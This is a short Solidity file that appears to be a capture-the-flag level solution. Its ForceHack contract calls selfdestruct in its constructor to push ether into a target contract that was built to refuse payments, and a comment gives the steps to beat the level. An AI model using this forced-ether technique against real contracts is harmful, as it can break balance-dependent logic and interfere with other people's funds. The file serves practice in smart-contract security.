/**
 * How to beat this level:
 * 1) Deploy ForceHack and send 1 Wei at deployment
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
